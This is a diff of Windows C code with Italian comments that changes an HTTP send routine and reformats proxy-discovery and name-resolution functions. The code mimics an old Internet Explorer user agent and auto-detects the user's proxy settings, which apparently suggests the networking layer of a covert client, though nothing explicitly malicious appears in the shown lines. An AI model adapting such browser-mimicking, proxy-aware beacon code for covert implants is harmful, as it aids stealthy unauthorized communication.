@@ -64,17 +64,19 @@ BOOL WinHTTPSendData(PBYTE pBuffer, ULONG uBuffLen)
 {
 #ifdef _DEBUG
 	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
-	swprintf_s((wchar_t *)pDebugString, 1024, L"[+] Sending %08x byte of AUTH request\n", uBuffLen);
+	swprintf_s((wchar_t *)pDebugString, 1024, L"[+] Sending %08x byte of request\n", uBuffLen);
 	OutputDebugString(pDebugString);
 	free(pDebugString);
 #endif
 	BOOL ret;
+	WCHAR pContentLength[1024];
+	swprintf_s(pContentLength, 1024, L"Content-Length: %d", uBuffLen);
 	ret = WinHttpSendRequest(hGlobalInternet, 
-		WINHTTP_NO_ADDITIONAL_HEADERS, 
+		pContentLength,
 		-1L, 
 		pBuffer, 
 		uBuffLen, 
-		uBuffLen, 
+		0,
 		NULL);
 
 	if (!ret)
@@ -109,15 +111,18 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 	hSession = WinHttpOpen(L"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
 
 	// Cerca nel registry le configurazioni del proxy
-	if (hSession && WinHttpGetIEProxyConfigForCurrentUser(&pProxyConfig)) {
-		if (pProxyConfig.lpszProxy) {
+	if (hSession && WinHttpGetIEProxyConfigForCurrentUser(&pProxyConfig)) 
+	{
+		if (pProxyConfig.lpszProxy) 
+		{
 			// Proxy specificato
 			pProxyInfo.lpszProxy = pProxyConfig.lpszProxy;
 			pProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
 			pProxyInfo.lpszProxyBypass = NULL;
 		}
 
-		if (pProxyConfig.lpszAutoConfigUrl) {
+		if (pProxyConfig.lpszAutoConfigUrl)
+		{
 			// Script proxy pac
 			pOptPAC.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
 			pOptPAC.lpszAutoConfigUrl = pProxyConfig.lpszAutoConfigUrl;
@@ -130,7 +135,8 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 				memcpy(&pProxyInfo, &pProxyInfoTemp, sizeof(pProxyInfo));
 		}
 
-		if (pProxyConfig.fAutoDetect) {
+		if (pProxyConfig.fAutoDetect) 
+		{
 			// Autodetect proxy
 			pOptPAC.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
 			pOptPAC.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
@@ -144,17 +150,20 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 		}
 
 		// Se ha trovato un valore sensato per il proxy, allora ritorna
-		if (pProxyInfo.lpszProxy) {
+		if (pProxyInfo.lpszProxy) 
+		{
 			isProxy = TRUE;
 			WinHttpSetOption(hSession, WINHTTP_OPTION_PROXY, &pProxyInfo, sizeof(pProxyInfo));
 
 			// Parsa la stringa per separare la porta
 			_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%S", pProxyInfo.lpszProxy);
-			if (pAddrPtr = (PBYTE)strchr((PCHAR)pAddrToConnect, (int)':')) {
+			if (pAddrPtr = (PBYTE)strchr((PCHAR)pAddrToConnect, (int)':')) 
+			{
 				*pAddrPtr = 0;
 				pAddrPtr++;
 				sscanf_s((PCHAR)pAddrPtr, "%d", pPortToConnect);
-			} else
+			} 
+			else
 				*pPortToConnect = 8080;
 
 			if (!ResolveName(pAddrToConnect, pAddrToConnect, uBufLen))
@@ -168,7 +177,8 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 		}
 	}
 
-	if (!isProxy) {
+	if (!isProxy) 
+	{
 		*pPortToConnect = 80; // se ci stiamo connettendo diretti usiamo di default la porta 80
 		if (!ResolveName(pServerUrl, pAddrToConnect, uBufLen))
 		{
@@ -219,7 +229,8 @@ BOOL ResolveName(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen)
 #endif
 
 	// E' gia' un indirizzo IP
-	if (inet_addr((PCHAR)pServerUrl) != INADDR_NONE) {
+	if (inet_addr((PCHAR)pServerUrl) != INADDR_NONE) 
+	{
 		_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%s", pServerUrl);
 		return TRUE;
 	}
